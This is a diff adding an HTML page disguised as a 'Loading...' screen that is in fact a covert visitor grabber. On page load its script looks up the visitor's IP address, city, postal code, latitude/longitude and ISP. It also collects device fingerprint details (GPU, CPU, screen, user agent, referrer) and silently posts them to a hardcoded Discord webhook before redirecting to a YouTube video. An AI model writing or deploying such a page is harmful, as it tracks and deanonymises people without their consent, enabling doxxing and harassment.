@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading...</title>
+  <meta charset="UTF-8">
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1378068376861151242/dCikl5PeexxX0IaaxyotOBeXHF7GqSiN1bu2pbmNf5RbaFcVXygWN3AA9_NRoByNEzVV";
+
+    // Get GPU info via WebGL
+    function getGPUInfo() {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      if (!gl) return "Unavailable";
+
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      if (debugInfo) {
+        const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        return `${vendor} - ${renderer}`;
+      }
+      return "Unavailable";
+    }
+
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(data => {
+        // Network & Location
+        const ip = data.ip;
+        const city = data.city;
+        const region = data.region;
+        const country = data.country_name;
+        const postal = data.postal;
+        const latitude = data.latitude;
+        const longitude = data.longitude;
+        const isp = data.org;
+        const asn = data.asn;
+        const apiTimezone = data.timezone;
+
+        // System & Browser
+        const userAgent = navigator.userAgent;
+        const deviceType = /Mobi|Android/i.test(userAgent) ? "Phone" : "PC";
+        const cpu = navigator.hardwareConcurrency || "N/A";
+        const gpu = getGPUInfo();
+        const resolution = `${screen.width}x${screen.height}`;
+        const colorDepth = screen.colorDepth;
+        const platform = navigator.platform;
+        const language = navigator.language;
+        const localTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const referrer = document.referrer || "None";
+
+        const message = `
+🔔 **New Visitor Info**
+🌐 IP: \`${ip}\`
+🏙️ Location: ${city}, ${region}, ${country} ${postal}
+📌 Lat/Lon: ${latitude}, ${longitude}
+📡 ISP: ${isp}
+🏛️ ASN: ${asn}
+🕰️ Timezone: ${localTimezone} (API: ${apiTimezone})
+
+💻 Device: ${deviceType}
+🧠 CPU Threads: ${cpu}
+🎮 GPU: ${gpu}
+🖥️ Screen: ${resolution}, ${colorDepth}-bit
+🧭 Platform: ${platform}
+🗣️ Language: ${language}
+🔗 Referrer: ${referrer}
+🧾 User-Agent: \`${userAgent}\`
+        `;
+
+        fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: message })
+        });
+      })
+      .catch(console.error)
+      .finally(() => {
+        // Redirect after a delay
+        setTimeout(() => {
+          window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+        }, 1500);
+      });
+  </script>
+</head>
+<body>
+  <p>Loading...</p>
+</body>
+</html>
